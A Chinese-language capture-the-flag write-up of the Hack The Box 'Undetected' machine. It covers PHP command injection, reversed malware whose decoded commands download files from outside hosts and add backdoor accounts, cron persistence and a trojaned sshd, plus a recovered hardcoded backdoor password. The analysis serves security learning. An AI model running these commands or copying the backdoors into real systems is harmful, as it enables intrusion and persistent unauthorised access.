[https://app.hackthebox.com/machines/439](https://app.hackthebox.com/machines/439)

nmap扫描结果

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261639622.png)

---

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261640454.png)

把`10.10.11.146    store.djewelry.htb`加到`/etc/hosts`里面

xray直接扫出来了...

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261643629.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261650556.png)

`<?php system("find /var/www -name '*' | xargs grep -i password");?>`

没有得到有效信息,当前用户为`www-data`

`<?php system("cat /etc/passwd | grep sh");?>`

```
root:x:0:0:root:/root:/bin/bash
steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
steven1:x:1000:1000:,,,:/home/steven:/bin/bash
```

`/etc/passwd`显示存在`steven`用户,但没有权限进入`/home/steven`因此需要先提权到`steven`或者是`steven1`

[Linux权限提升：自动化信息收集](https://www.freebuf.com/articles/network/274223.html)

利用[linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)进行信息搜集,但信息量太大,无从下手

去瞄了眼wp[hackthebox-undetected-writeup](https://0xdedinfosec.vercel.app/posts/hackthebox-undetected-writeup),别人是在路径爆破的时候得到了一个叫`info`的ELF(我跳步了...)

具体路径位于`/var/backups/info`

`main->check_root->check_shell->exec_shell`

```cpp
int exec_shell()
{
  char *v0; // rax
  char *v1; // rax
  char *v2; // rax
  char *argv[4]; // [rsp+0h] [rbp-A90h] BYREF
  char v5[1328]; // [rsp+20h] [rbp-A70h] BYREF
  char v6[1320]; // [rsp+550h] [rbp-540h] BYREF
  char *path; // [rsp+A78h] [rbp-18h]
  char *v8; // [rsp+A80h] [rbp-10h]
  char *v9; // [rsp+A88h] [rbp-8h]

  path = "/bin/bash";
  strcpy(
    v6,
    "776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65"
    "645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420"
    "373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e"
    "3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030"
    "207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866"
    "316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30"
    "522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f"
    "7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d"
    "28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768"
    "696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a24"
    "67726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572"
    "732e7478743b20726d2075736572732e7478743b");
  v9 = v6;
  v8 = v5;
  while ( *v9 )
  {
    v0 = v9++;
    v6[1319] = hexdigit2int((unsigned __int8)*v0);
    v1 = v9++;
    v6[1318] = hexdigit2int((unsigned __int8)*v1);
    v2 = v8++;
    *v2 = v6[1318] | (16 * v6[1319]);
  }
  *v8 = 0;
  argv[0] = path;
  argv[1] = "-c";
  argv[2] = v5;
  argv[3] = 0LL;
  return execve(path, argv, 0LL);
}
```

将那串16进制转换为ascii得到

```
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;
```

得到一个`/etc/shadow`里面的哈希`$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/`,利用cmd5对其进行反查,没有得到结果

利用`john`进行手动爆破,得到`ihatehackers`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262117055.png)

以`steven1@10.10.11.146`成功登录

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262119251.png)

---

前面用`linPEAS`得到信息,可以利用`CVE-2021-4034`进行提权

```
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
```

但是缺少比如`make`,`cc`,`cc1`等条件,无法编译(手动上传也不行...)

`CVE-2021-3156`已经patched

除了直接提权外,还有邮件可能可以利用

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262146386.png)

`/var/mail/steven`

```
From root@production  Sun, 25 Jul 2021 10:31:12 GMT
Return-Path: <root@production>
Received: from production (localhost [127.0.0.1])
	by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
	for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT
Received: (from root@localhost)
	by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
	Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
Message-Id: <202107251031.80FAcdZ171847@production>
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If for any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin
```

对`apache2`进行了更新...

```
steven@production:/tmp$ whereis apache2
apache2: /usr/sbin/apache2 /usr/lib/apache2 /etc/apache2 /usr/share/apache2 /usr/share/man/man8/apache2.8.gz

steven@production:/usr/lib/apache2/modules$ pwd
/usr/lib/apache2/modules
steven@production:/usr/lib/apache2/modules$ ls -lrt
total 8772
-rw-r--r-- 1 root root   34800 May 17  2021 mod_reader.so
-rw-r--r-- 1 root root 4625776 Nov 25 23:16 libphp7.4.so
```

```
ls按时间 降序 排列： ls -lt (最常用)

ls按时间 升序 排列：ls -lrt
```

`mod_reader.so`是最后更新的文件

```cpp
int __fastcall hook_post_config(apr_pool_t_0 *pconf, apr_pool_t_0 *plog, apr_pool_t_0 *ptemp, server_rec_0 *s)
{
  char *args[4]; // [rsp+0h] [rbp-38h] BYREF
  unsigned __int64 v6; // [rsp+28h] [rbp-10h]

  v6 = __readfsqword(0x28u);
  pid = fork();
  if ( !pid )
  {
    b64_decode(
      "d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYm"
      "luL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk",
      0LL);
    args[2] = 0LL;
    args[3] = 0LL;
    args[0] = "/bin/bash";
    args[1] = "-c";
    execve("/bin/bash", args, 0LL);
  }
  return 0;
}
```

`wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd`

---

后面对于`/usr/sbin/sshd`的逆向分析是看wp了,对`auth_password`进行分析

```cpp
int __fastcall auth_password(ssh *ssh, const char *password)
{
  char v2; // dl
  Authctxt_0 *v3; // rbx
  passwd *v4; // r13
  int v5; // er12
  char *v6; // rax
  int v7; // er8
  int result; // eax
  size_t v9; // r8
  int v10; // er13
  char backdoor[31]; // [rsp+0h] [rbp-58h] BYREF
  char v12; // [rsp+1Fh] [rbp-39h] BYREF
  unsigned __int64 v13; // [rsp+28h] [rbp-30h]

  v2 = 0xD6;
  v3 = (Authctxt_0 *)ssh->authctxt;
  v13 = __readfsqword(0x28u);
  *(_WORD *)&backdoor[28] = 0xA9F4;
  v4 = v3->pw;
  v5 = v3->valid;
  *(_DWORD *)&backdoor[24] = 0xBCF0B5E3;
  *(_QWORD *)&backdoor[16] = 0xB2D6F4A0FDA0B3D6LL;
  v6 = backdoor;
  backdoor[30] = 0xA5;
  *(__m128i *)backdoor = _mm_load_si128((const __m128i *)&xmmword_7DB30);//xmmword_7DB30   xmmword 0FDB3D6E7F7BBFDC8A4B3A3F3F0E7ABD6h
  while ( 1 )
  {
    *v6++ = v2 ^ 0x96;
    if ( v6 == &v12 )
      break;
    v2 = *v6;
  }
```

最终的backdoor为

```
0xa5
0xa9f4
0xbcf0b5e3
0xb2d6f4a0fda0b3d6
0xfdb3d6e7
0xf7bbfdc8
0xa4b3a3f3
0xf0e7abd6
```

异或之后的结果为`@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271203322.png)